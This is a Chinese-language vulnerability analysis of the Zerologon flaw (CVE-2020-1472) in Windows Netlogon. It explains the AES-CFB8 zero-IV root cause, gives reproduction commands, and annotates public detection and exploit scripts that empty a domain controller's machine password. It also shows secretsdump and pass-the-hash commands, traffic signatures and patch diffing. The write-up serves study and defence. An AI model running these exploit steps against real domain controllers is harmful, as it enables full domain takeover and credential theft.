@@ -1,0 +1,619 @@
+## ****一、漏洞信息****
+
+###  ** **1\. 漏洞简述****
+
+> 漏洞名称：Netlogon 权限提升漏洞
+>
+> 漏洞编号：CVE-2020-1472
+>
+> 漏洞类型：权限提升
+>
+> CVSS评分：10
+>
+> 利用难度：简单
+>
+> 基础用户：不需要
+
+###  ** **2\. 组件概述****
+
+Netlogon远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库。
+
+Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系。此RPC接口用于发现和管理这些关系。
+
+###  ** **3\. 漏洞利用****
+
+该漏洞主要是由于在使用Netlogon安全通道与域控进行连接时，由于认证协议加密部分的缺陷，导致攻击者可以将域控管理员用户的密码置为空，从而进一步实现密码hash获取并最终获得管理员权限。成功的利用可以实现以管理员权限登录域控设备，并进一步控制整个域。
+
+###  ** **4\. 漏洞影响****
+
+> Microsoft Windows Server 2008 R2 SP1
+>
+> Microsoft Windows Server 2012
+>
+> Microsoft Windows Server 2012 R2
+>
+> Microsoft Windows Server 2016
+>
+> Microsoft Windows Server 2019
+>
+> Microsoft Windows Server version 2004 (Server Core Installation)
+>
+> Microsoft Windows Server version 1903 (Server Core Installation)
+>
+> Microsoft Windows Server version 1909 (Server Core Installation)
+
+###  ** **5\. 解决方案****
+
+微软官方针对该漏洞的解决方案分成了2部分：
+
+第1部分，首先发布该漏洞的安全更新补丁，补丁地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472
+
+第2部分，在2021年的Q1完成对所有加入域的设备（包含非Windows设备）的全面保护。
+
+##  ** **二、漏洞复现****
+
+###  ** **1\. 环境搭建****
+
+> 域控主机name：ADSrv01
+>
+> 域控ip：xxxx
+
+靶机操作：
+
+安装impacket：
+
+python setup.py install
+
+###  ** **2\. 漏洞检测****
+
+使用公开的检测脚本进行检测：
+
+pip install -r requirements.txt  
+python Scan.py ADSrv01 <IP>
+
+检测结果：
+
+（1）存在漏洞
+
+![](https://image.3001.net/images/20201110/1604972603_5fa9f03b465b5112f667c.png!small)
+
+（2）已安装更新补丁![](https://image.3001.net/images/20201110/1604972616_5fa9f048856239f0931b2.png!small)
+
+###  ** **3\. 漏洞利用****
+
+同样，使用公开的利用脚本（重置密码为空）进行漏洞利用验证：
+
+python poc.py ADSrv01 <IP>
+
+运行结果（与检测环境不同，但不影响漏洞利用）：
+
+![](https://image.3001.net/images/20201110/1604972636_5fa9f05c11cadf178c6e9.png!small)
+
+  
+
+然后，使用空密码获取hash：
+
+    
+    
+    python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'Domain/DC_NETBIOS_NAME$@dc_ip_addr' example： secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'v4ler1an/ADSrv01$@<IP>'
+
+这里我使用的powershell，所以会弹出一个cmd，输出hash信息，然后快速关掉，可以使用linux，就会保持窗口不会立刻关闭了：
+
+![](https://image.3001.net/images/20201110/1604972708_5fa9f0a4766faf7cd543e.png!small)
+
+这里可以拿到administrator的密码hash，然后就可以使用hash进行登录了：
+
+    
+    
+    wmiexec.py -hashes HASH DOMAIN/USERNAME@IP
+
+此处的例子为：
+
+    
+    
+    wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8756481b09eec95190a6663a2dd879ab v4ler1an/adminstrator@<IP>
+
+![](https://image.3001.net/images/20201110/1604972749_5fa9f0cd2f62fc7a40b94.png!small)
+
+后续操作：
+
+![](https://image.3001.net/images/20201110/1604972765_5fa9f0dd4c1c4af89966f.png!small)
+
+##  ** **三、漏洞分析****
+
+###  ** **1.基本信息****
+
+> 漏洞文件：dll
+>
+> 漏洞函数：NetrServerAuthenticate3等
+>
+> 漏洞算法：AES-CFB8
+
+###  ** **2\. 背景知识****
+
+Netlogon Remote
+Protocol，是在Windows域控上开启的一个RPC接口。它用于执行与用户和计算机身份验证相关的各种task，最常见的是方便用户使用NTLM协议登录服务器。其他功能包括NTP
+response的身份验证，尤其是可以让计算机在域内更新其密码。
+RPC接口可通过TCP（通过域控制器的portmapper服务分配的动态端口）或通过端口445上的SMB管道来使用。
+
+该协议并未使用RPC服务的相同的认证策略，它使用了一种密码学协议来让client（域内）和域控的进行client的账户密码hash的确认，使用这种方式的主要原因是在Windows
+NT时代，计算机账户不再是首选原则，因此就无法使用类似NTLM或者Kerberos之类的标准用户身份验证方案。
+
+Netlogon
+session初始化由client完成，client和sever会交换随机的8字节随机数（称为challenges），然后他们都通过使用密钥派生函数将两个challenges与client的账户密码hash混合在一起来计算session
+key。然后，client使用计算得到的session key计算得到一个client credential。
+
+server重新计算相同的credential，如果与client计算的结果相同，则判定client拥有正确的用户密码以及session
+key，验证通过。其过程大致如下图所示：
+
+![](https://image.3001.net/images/20201110/1604972785_5fa9f0f189fcf1e79d713.png!small)
+
+在认证握手阶段，client和server都可以协商是否对subsequent messages进行加密和密码学认证(称为seal and
+sign)，其主要目的是抵御网络层面的攻击者。如果不使用加密，一些执行重要action的Netlogon
+call仍然会包含一个authticator值，该值也是使用session key计算获得。
+
+###  ** **3\. 详细分析****
+
+client和server用于生成credential的加密原语由ComputeNetlogonCredential()函数实现，该函数接收一个8字节长度的输入，然后使用session
+key对其进行转换，输出8字节长度的数据。这里保证安全性的基本思路是，不知道session
+key的攻击者将无法计算或猜测与某个输入匹配的正确输出，那么也就无法获取可以成功实现认证的credential。
+
+#### 1\. 2种credential的算法
+
+在计算credential时可使用的算法有2种：AES-CFB8和2DES。
+
+ ** **2DES****
+
+在使用2DES进行计算时，计算session key的逻辑如下：
+
+    
+    
+    InitLMKey(KeyIn, KeyOut)
+           KeyOut[0] = KeyIn[0] >> 0x01;
+           KeyOut[1] = ((KeyIn[0]&0x01)<<6) | (KeyIn[1]>>2);
+           KeyOut[2] = ((KeyIn[1]&0x03)<<5) | (KeyIn[2]>>3);
+           KeyOut[3] = ((KeyIn[2]&0x07)<<4) | (KeyIn[3]>>4);
+           KeyOut[4] = ((KeyIn[3]&0x0F)<<3) | (KeyIn[4]>>5);
+           KeyOut[5] = ((KeyIn[4]&0x1F)<<2) | (KeyIn[5]>>6);
+           KeyOut[6] = ((KeyIn[5]&0x3F)<<1) | (KeyIn[6]>>7);
+           KeyOut[7] = KeyIn[6] & 0x7F;
+      
+     for( int i=0; i<8; i++ ){
+           KeyOut[i] = (KeyOut[i] << 1) & 0xfe;
+        }
+
+假设bytes(s,e,l)为从字节数组l返回，从s到e 。session key计算完成后，credential按照如下逻辑进行计算：
+
+    
+    
+    ComputeNetlogonCredential(Input, Sk,
+                  Output)
+      
+           SET k1 to bytes(0, 6, Sk)
+           CALL InitLMKey(k1, k3)
+           SET k2 to bytes(7, 13, Sk)
+           CALL InitLMKey(k2, k4)
+           CALL DES_ECB(Input, k3, &output1)
+           CALL DES_ECB(output1, k4, &output2)
+           SET Output to output2
+
+ ** **AES-CFB8****
+
+如果client和server之间协商了AES支持，则使用AES-128加密算法，使用0初始化矢量在8位CFB模式下计算Netlogon凭据。
+其计算过程大致如下：
+
+    
+    
+    ComputeNetlogonCredential(Input, Sk, Output)
+      
+           SET IV = 0
+           CALL AesEncrypt(Input, Sk, IV, Output)
+
+AesEncrypt是8位CFB模式下的AES-128加密算法，初始化矢量为0。
+
+具体使用哪种算法，是在进行认证时由client进行相关flags的设置。但是，由于现代版本的Windows
+Server的默认设置都会拒绝使用2DES加密方案，所以大多数的domains都使用AES加密方案。而本次漏洞就产生于这种新发展的加密方案，2DES的旧版加密方案反而没有该漏洞的存在。
+
+#### 2\. 存在漏洞的AES-CFB8
+
+基本的AES块密码操作需要16个字节的输入并将其置换为大小相等的输出，为了加密更大或更小的input，需要选择一种操作模式。在ComputerNetlogonCredential()函数中，仅需要转换8字节数据，选择了CFB8模式。因为该模式比一般的AES的任何一种模式都要慢大约16倍，所以利用范围很有限，大部分情况下都不会选择使用该模式。
+
+AES-CFB8算法的计算过程大致如下：
+
+> 首先，在明文plaintext前面加上16字节长度的Initialistation Vector(VI)
+>
+> 对修改后的VI+plaintext进行AES运算，获取其结果的第1个字节
+>
+> 使用获取的第1和字节和plaintext的下一个字节进行异或操作
+
+上述过程示意图如下：
+
+![](https://image.3001.net/images/20201110/1604972875_5fa9f14b0bfaed3723235.png!small)
+
+  
+
+从上面的过程可以看出，为了完成对message的各个字节数据的加密，需要指定一个IV来引导整个过程。IV必须具备唯一性，且必须为随机值，这样对于同一个plaintext才可能产生不同的加密结果。但是，在ComputeNetlogonCredential()函数中，该值被设置为了
+** **固定长度、值全为0的16字节数据**** 。但是，使用全0的VI，就一定会出问题吗？概率很低，但不代表没有概率： **
+**在256个密钥中总是可以找到1个，对全0的plaintext应用AES**** ** **-**** **
+**CFB8加密将导致全0的ciphertext**** ，其过程如下：
+
+![](https://image.3001.net/images/20201110/1604972907_5fa9f16b362b95f889d81.png!small)
+
+  
+
+也就是说，如果IV和plaintext均为0，那么有256次机会可以找到一个key，使得最后的计算结果也全为0。实际上，此属性比较通用：当IV仅由0组成时，将存在一个0≤X≤255的整数，该整数表示以n字节开头的X值的明文最终被转换成n个值为0的字节开头的密文。X取决于加密密钥，并且是随机分布的。
+
+到此为止，漏洞内容已经明确：一个全0的输入会导致一个全0的输出。
+
+###  ** **4\. 利用思路****
+
+#### 1.欺骗client credential
+
+在通过NetrServerReqChallenge()函数完成challenges交换后，client会调用NetrServerAuthenticate3()函数来进行自身验证，函数原型如下：
+
+    
+    
+    NTSTATUS NetrServerAuthenticate3(
+       [in, unique, string] LOGONSRV_HANDLE PrimaryName,
+       [in, string] wchar_t* AccountName,
+       [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
+       [in, string] wchar_t* ComputerName,
+       [in] PNETLOGON_CREDENTIAL ClientCredential,
+       [out] PNETLOGON_CREDENTIAL ServerCredential,
+       [in, out] ULONG * NegotiateFlags,
+       [out] ULONG * AccountRid
+     );
+
+该函数的ClientCrendential参数为一个指向NETLOGON_CREDENTIAL结构的指针，该结构中包含client的credential：
+
+    
+    
+    typedef struct _NETLOGON_CREDENTIAL {
+       CHAR data[8];
+     } NETLOGON_CREDENTIAL,
+      *PNETLOGON_CREDENTIAL;
+
+credential的计算由ComputeNetlogonCredential()完成，该函数利用NetrServerReqChallenge()函数传来的challenge进行计算，而challenge是完全可以由我们控制的，因此可以设置为8个0。这也就意味着，对于一个正确有效的ClientCredential来说，可以在256次机会中计算得到一个全0的ClientCredential。
+
+因为server在每次认证请求中也会产生一个server challenge，该值也是session
+key计算的一个参数，也就是说，对于每次认证请求，session
+key都是不同的。但是因为计算机并没有做防爆破的机制，登录认证失败后可以一直尝试登录，所以可以进行爆破，直到找到正确的key。
+
+#### 2\. 绕过signing 和 sealing
+
+虽然通过第一步可以实现身份验证绕过，但是对于Netlogon的传输加密机制（RPC signing and sealing）来说，我们不知道session
+key到底是多少。但是，singing和sealing是可选项，可以通过在NetrServerAuthenticate3()函数中取消设置对应的标志位来关闭这些选项。在现代的client中，默认是拒绝接受未设置这2个flag的server的连接请求的，但是server并不拒绝client的连接请求。所以，我们可以在进行攻击时手动关闭这个flag。
+
+#### 3\. 欺骗调用
+
+即使禁用了加密，每个执行某些敏感操作的函数调用也必须包含一个Authenticator值。
+该值通过使用ComputeNetlogonCredential()计算ClientStoredCredential + Timestamp获得：
+
+    
+    
+    SET TimeNow = current time;
+     SET ClientAuthenticator.Timestamp = TimeNow;
+     SET ClientStoredCredential = ClientStoredCredential + TimeNow;
+     CALL ComputeNetlogonCredential(ClientStoredCredential,
+                   Session-Key, ClientAuthenticator.Credential);
+
+ClientStoredCredential是client维护的一个增量值。 执行握手时，它会初始化为与我们提供的ClientCredential相同的值。
+因为client credential全0，因此对于身份验证后执行的第1个调用，ClientStoredCredential的值为0。  
+TimeStamp为NETLOGON_AUTHENTICATOR结构中的TimeStamp字段，包含当前的Posix时间。
+实际上，server并未对该值设置多少限制，因此可以简单地设置为1970年1月1日，即值设为0。  
+经过第一步后，我们知道ComputeNetlogonCredential(0)=0。因此，可以通过简单地提供全0的authenticator和全0
+的TimeStamp来验证第1个调用。
+
+#### 4\. 修改计算机的AD域密码
+
+经过前3步后，我们已经可以向任何计算机发起Netlogon的请求。接下来，一种思路是调用NetrServerPasswordGet()函数来获取计算机密码的NTLM哈希。但是，哈希利用了另外一种机制使用session
+key进行加密，所以该函数无法利用。退而使用NetrServerPasswordSet2()函数，其主要作用为client设置新的计算机密码，函数原型如下：
+
+    
+    
+    NTSTATUS NetrServerPasswordSet2(
+       [in, unique, string] LOGONSRV_HANDLE PrimaryName,
+       [in, string] wchar_t* AccountName,
+       [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
+       [in, string] wchar_t* ComputerName,
+       [in] PNETLOGON_AUTHENTICATOR Authenticator,
+       [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
+       [in] PNL_TRUST_PASSWORD ClearNewPassword
+     );
+
+这种密码没有hash，但是使用session key进行了加密。可以再次使用CFB8和全0的IV进行解决。
+
+plaintext密码结构包含516个字节，最后的4个字节指明了密码长度（字节为单位）。结构中所有不属于密码功能的字节都被视为填充，并且可以具有任意值。如果我们提供516个0，那么加密结果就是516个0。实际上，计算机并不禁止设置空密码，所以这里使用516个0可以登录域上的任意一台计算机。完成后，可以代表此计算机建立新的Netlogon连接。
+这次计算机的密码是空的，因此可以正常使用该协议。 如果需要，现在还可以设置任何其他非空密码。其过程大致如下：
+
+![](https://image.3001.net/images/20201110/1604973018_5fa9f1daaec2c5114899a.png!small)
+
+  
+
+以这种方式更改计算机密码时，只能在AD中更改。 目标系统本身仍将在本地存储其原始密码。
+然后，该计算机将无法再向域进行身份验证，并且只能通过手动操作来重新同步。
+因此，可以将任何设备锁定在域外。同样，只要计算机帐户在域中具有特殊特权，现在就可以滥用这些特权。
+
+#### 5\. 从改密到域控
+
+ ** **后续可能跟渗透关系更大，个人对渗透了解不多，可能理解有误。****
+
+到此为止，可以更改的密码是DC本身的密码，AD中存储的DC密码与存储在本地注册表（HKLM\SECURITY\Policy\Secrets\$machine.ACC）中的并不相同。这可能会造成DC发生一些不可预知的情况，但是仍然可以登录。运行Impacket的secretsdump脚本可以让DC的密码生效，该脚本会利用复制DRS协议通过域的从域中提取所有用户HASH，包括域管理员HASH（包括krbtgt，可以用来制作黄金票据），然后用来登录DC更新电脑密码注册表，就可以令攻击者成为域管理员。
+
+###  ** **5\. PoC分析****
+
+针对该漏洞的poc目前有2种，1种是检测脚本，1种是完整的漏洞利用脚本。
+
+检测脚本的代码分析如下：
+
+    
+    
+    #!/usr/bin/env python3
+    
+    # impacket是该漏洞利用使用的主要的python库，用到了其中的诸多功能
+    from impacket.dcerpc.v5 import nrpc, epm
+    from impacket.dcerpc.v5.dtypes import NULL
+    from impacket.dcerpc.v5 import transport
+    from impacket import crypto
+    
+    import hmac, hashlib, struct, sys, socket, time
+    from binascii import hexlify, unhexlify
+    from subprocess import check_call
+    
+    # 根据前面的分析，理论上来讲，只要256次爆破就可以，但是为了保险和意外情况，这里作者给到了2000
+    MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
+    
+    # 错误回显，良心
+    def fail(msg):
+      print(msg, file=sys.stderr)
+      print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
+      sys.exit(2)
+    
+    # 尝试使用全0的凭据进行登录
+    def try_zero_authenticate(dc_handle, dc_ip, target_computer):
+      # 连接到DC的Netlogon服务.
+      binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
+      rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
+      rpc_con.connect()
+      rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
+    
+      # 使用全0的challenge以及credential.
+      plaintext = b'\x00' * 8
+      ciphertext = b'\x00' * 8
+    
+      # 标准flags字段值设置，作者生成其参考为win10系统，但目前该值的设置普遍适用到最低winSrv2008.这里关闭了sign/seal标志位  
+      flags = 0x212fffff
+    
+      # 发送challenge和认证请求
+      nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
+      try:
+        server_auth = nrpc.hNetrServerAuthenticate3( # 调用NetrServerAuthenticate3函数
+          rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+          target_computer + '\x00', ciphertext, flags
+        )
+        
+        # Impacket中hNetrServerAuthenticate3函数实现：
+        # def hNetrServerAuthenticate3(dce, primaryName, accountName, secureChannelType, computerName, clientCredential, negotiateFlags):
+        # request = NetrServerAuthenticate3()
+        # request['PrimaryName'] = checkNullString(primaryName) -----> dc_handle + '\x00'
+        # request['AccountName'] = checkNullString(accountName) -----> target_computer + '$\x00'，以空值结尾的Unicode字符串，用于标识包含客户端和服务器之间共享的密钥（密码）的帐户名称。
+        # request['SecureChannelType'] = secureChannelType ----------> nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel，NETLOGON_SECURE_CHANNEL_TYPE枚举值，指示此调用建立的安全通道的类型。
+        # request['ClientCredential'] = clientCredential ------------> ciphertext，指向NETLOGON_CREDENTIAL结构的指针，该结构包含客户端凭据。
+        # request['ComputerName'] = checkNullString(computerName) ---> target_computer + '\x00'，一个空终止的Unicode字符串，其中包含调用此方法的客户端计算机的NetBIOS名称。
+        # request['NegotiateFlags'] = negotiateFlags ----------------> flags
+        # return dce.request(request)
+       
+        # 认证成功
+        assert server_auth['ErrorCode'] == 0
+        return rpc_con
+    
+      except nrpc.DCERPCSessionError as ex:
+        # 如果失败，报一个STATUS_ACCESS_DENIED错误。在爆破成功前，都会返回该错误。
+        if ex.get_error_code() == 0xc0000022:
+          return None
+        else:
+          fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
+      except BaseException as ex:
+        fail(f'Unexpected error: {ex}.')
+    
+    
+    def perform_attack(dc_handle, dc_ip, target_computer):
+      # 进行爆破，平均次数为256
+      print('Performing authentication attempts...')
+      rpc_con = None
+      for attempt in range(0, MAX_ATTEMPTS):  
+        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
+        
+        if rpc_con == None:
+          print('=', end='', flush=True)
+        else:
+          break
+    
+      if rpc_con:
+        print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
+      else:
+        print('\nAttack failed. Target is probably patched.')
+        sys.exit(1)
+    
+    
+    if __name__ == '__main__':
+      if not (3 <= len(sys.argv) <= 4):
+        print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
+        print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
+        print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
+        sys.exit(1)
+      else:
+        [_, dc_name, dc_ip] = sys.argv
+    
+        dc_name = dc_name.rstrip('$')
+        perform_attack('\\\\' + dc_name, dc_ip, dc_name)
+
+其实本质上来说，漏洞检测脚本也是利用了漏洞了，尝试登录多次，根据是否登录成功来判断是否存在漏洞。某种意义上来说，这不算一种无损检测。
+
+漏洞利用的脚本关键代码如下：
+
+    
+    
+    ......
+    # 爆破范围与检测脚本一致
+    MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
+    
+    # 异或
+    def byte_xor(ba1, ba2):
+        return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
+    
+    ......
+    
+    def try_zero_authenticate(dc_handle, dc_ip, target_computer):
+      # 同样登录DC的Netlogon服务.
+      binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
+      rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
+      rpc_con.connect()
+      rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
+    
+      # 使用全0的challenge和credential.
+      plaintext = b'\x00' * 8
+      ciphertext = b'\x00' * 8
+    
+      # flags设置与检测脚本一致
+      flags = 0x212fffff
+    
+      # 发送challenge和认证请求
+      serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
+      serverChallenge = serverChallengeResp['ServerChallenge']
+      try:
+        server_auth = nrpc.hNetrServerAuthenticate3(
+          rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+          target_computer + '\x00', ciphertext, flags
+        )
+    
+        
+        # It worked!
+        assert server_auth['ErrorCode'] == 0
+        print()
+        server_auth.dump()
+        print("server challenge", serverChallenge)
+    
+        
+        # 设置IV为全0
+        try:
+          IV=b'\x00'*16
+          authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+          authenticator['Credential'] = ciphertext #authenticatorCred，全0
+          authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var， 全0
+          
+          request = nrpc.NetrServerPasswordSet2()
+          request['PrimaryName'] = NULL
+          request['AccountName'] = target_computer + '$\x00'
+          request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+          request['ComputerName'] = target_computer + '\x00'
+          request["Authenticator"] = authenticator
+          request["ClearNewPassword"] = nrpc.NL_TRUST_PASSWORD()
+          request["ClearNewPassword"]["Buffer"] = b'\x00'*512
+          request["ClearNewPassword"]["Length"] = 0 # 根据secura的白皮书，总计516字节，前面占了512字节，再跟4字节数据长度
+          resp = rpc_con.request(request)
+          resp.dump()
+        ......
+
+跟前面的利用思路一致，利用脚本相比检测脚本多了设置为空密码的过程。因为impackt中已经实现了大部分主要功能，所以exp开发难度不大。
+
+###  ** **6\. 流量分析****
+
+此处只对关键流量做一些分析，在DCERPC调用正式开始前还有一些SMB通信的相关流量，因为跟漏洞关系不大，此处不做赘述。
+
+#### 1\. 爆破特征
+
+![](https://image.3001.net/images/20201110/1604973207_5fa9f2977db0494fd6cfc.png!small)
+
+从流量包中可以明显看出爆破特征，在RPC_NETLOGON的流量之前，会有DCERPC和EPM的相关流量。上图的一个竖型红框为一组爆破流量。
+
+#### 2\. 漏洞特征
+
+![](https://image.3001.net/images/20201110/1604973222_5fa9f2a6418bba982df24.png!small)
+
+每组流量首先在DCERPC协商阶段协商使用的端口，即使用动态端口。因为操作系统版本为Windows Server
+2008或的公告版本，所以使用的端口为高端口，范围为49152~65535。因为没有使用固定端口，为流量检测带来一定难度。
+
+##### 1\. NetrServerReqChallenge
+
+![](https://image.3001.net/images/20201110/1604973242_5fa9f2ba128505212f32a.png!small)
+
+在流量中，并没有发现NetrServerReqChallenge()的明显特征，当然，这里的Client
+Challenge的全0值可以作为漏洞特征进行识别。除此之外，并未发现其他明显特征。
+
+##### 2\. NetrServerAuthenticate3
+
+![](https://image.3001.net/images/20201110/1604973258_5fa9f2ca0521fd8b4a6e1.png!small)
+
+相比NetrServerReqChallenge()函数的流量特征，NetrServerAuthenticate3()函数多了Negotiation
+options，该字段的以Authenticated RPC supported和AES
+support位的设置，对漏洞的成功利用具有重要作用，因此Negotiation options字段的流量特征和全0的Client
+Crenditial的流量特征，可以作为识别该漏洞的最明显特征。
+
+###  ** **7\. 补丁分析****
+
+微软在8月份发布了针对该漏洞的安全更新方案。与普通漏洞的安全更新不同，微软打算分阶段完成针对该漏洞的完整防御，但其声称在安装完8月份的安全更新后即可防御该漏洞。可以初步推断，微软打算替换现有的认证方案。考虑到域环境的复杂性，需要花费一定的时间来确认新方案的可行性。
+
+目前，微软官方对Netlogon协议的官方说明文档已经做了更新，部分重要更新如下：
+
+> 102页：引入了一个新设置项：VulnerableChannelAllowList，以安全描述符定义语言(Security Descriptor
+> Definition Language)表示的对Netlogon的client的设置不允许使用安全绑定。
+>
+> 104页：在session
+> key的协商过程中新增了一个步骤：如果client质询的前5个字节都不唯一，则server必须在不进行后续步骤的情况下使session key协商失败。
+>
+> 110页：session key的建立过程新增了两个步骤：“
+> 4，如果未使用安全绑定，除非client处于VulnerableChannelAllowList设置中，否则server必须拒绝该请求。”以及“
+> 6，如果前5个字节中没有一个 ClientStoredCredential的计算结果是唯一的，server必须在不进行后续步骤的情况下使session
+> key协商失败。
+
+更新前后对比使用的文件版本来自Windows Server
+2016，更新前文件版本号为：10.0.14393.1737，更新后版本号为：10.0.14393.3866。
+
+#### 1\. BinDiff结果
+
+![](https://image.3001.net/images/20201110/1604973308_5fa9f2fcef71a6f4e7bbd.png!small)
+
+  
+
+直接看NetrServerAuthenticate3()函数，改动总体上较大，但尚不确定针对该漏洞具体有效的更新。看关键的大改部分：
+
+![](https://image.3001.net/images/20201110/1604973324_5fa9f30cc21e78eccdebd.png!small)
+
+![](https://image.3001.net/images/20201110/1604973344_5fa9f3206efbb522ab02c.png!small)![](https://image.3001.net/images/20201110/1604973361_5fa9f3317098ba30cf30b.png!small)
+
+在IDA中看下新增对NlIsChallengeCredentialPairVulnerable()函数的调用：
+
+![](https://image.3001.net/images/20201110/1604973380_5fa9f344217a2a1f3a842.png!small)
+
+![](https://image.3001.net/images/20201110/1604973394_5fa9f352416599105f3db.png!small)
+
+  
+
+  
+
+进入到新函数NlIsChallengeCredentialPairVulnerable()内部：
+
+![](https://image.3001.net/images/20201110/1604973411_5fa9f3633427a23b79833.png!small)
+
+根据上述代码，我们可以得到该函数的大致逻辑：
+
+> client提供的challenge存储在rcx指向的buffer中；
+>
+> 检查一些全局变量，如果为1，则函数返回0，表示不存在漏洞。
+>
+> 检查rcx为非空，检查rdx为非空。
+>
+>
+> challenge的第1个字节存储在r9d中，然后在循环中将接下来的4个字节与它进行比较。如果这4个字节中的任何一个与第1个字节都不相同，则该函数返回0，不存在漏洞；否则返回1，存在漏洞。
+
+这种修复方式针对的主要是当前已公开的poc和exp，即challenge全0的情况（也可以变形成其他的全1或者全2等情况）。这种防御逻辑其实比较简单，现在还无法判定是否可以实现更进一步的补丁绕过。
+
+##  ** **四**** ** **、参考文献****
+
+> https://www.secura.com/pathtoimg.php?id=2055
+>
+> [MS-NRPC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-> nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f)
+>
+> https://blog.0patch.com/2020/09/micropatch-for-zerologon-perfect.html
+
